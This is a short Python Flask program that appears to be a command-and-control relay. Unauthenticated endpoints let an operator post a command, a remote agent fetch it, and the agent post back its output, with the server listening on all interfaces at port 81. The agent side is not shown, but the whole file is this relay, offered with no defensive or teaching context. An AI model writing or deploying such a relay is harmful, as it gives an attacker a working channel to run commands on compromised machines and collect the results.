from flask import Flask,request

app = Flask(__name__)
cmd = ""
output = ""

@app.route('/getcmd')
def getcmd():
    return f"{cmd}"

@app.route('/getoutput')
def getouput():
  return f"{output}"

@app.route("/setoutput",methods=['POST'])
def setoutput():
  global output
  output = request.form['output']#
  return "success"

@app.route("/setcommand",methods=['POST'])
def setcommand():
  global cmd
  cmd = request.form['cmd']
  return "success"


app.run(host='0.0.0.0', port=81)
